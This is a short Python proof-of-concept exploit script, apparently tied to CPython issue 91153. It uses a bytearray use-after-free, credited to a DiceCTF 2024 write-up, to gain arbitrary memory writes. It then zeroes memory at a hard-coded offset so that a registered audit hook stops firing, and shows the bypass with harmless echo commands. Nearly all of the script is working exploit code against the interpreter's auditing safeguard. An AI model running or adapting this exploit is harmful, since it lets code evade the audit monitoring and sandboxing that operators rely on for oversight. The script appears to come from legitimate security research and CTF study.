#!/usr/bin/env python3.12

### POC2-issue91153.py
### use ctypes to get the addr and smash it with issues/91153

import ctypes, sys

sys.addaudithook((lambda x: lambda *_: x("audit hook triggered!"))(print))

obj = ctypes.byref(ctypes.py_object(()))

ctypes._os.system("echo 'test audit hook -- this will trigger hook'")

# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# improved by Maple Bacon
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

# the offsets are from POC.py: 
# Python 3.11 = 0xe00
# Python 3.12 = 0x41448
# start addr
addr = ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448
memory[addr : addr + 8] = [0] * 8

ctypes._os.system("echo 'test audit hook -- this will not'")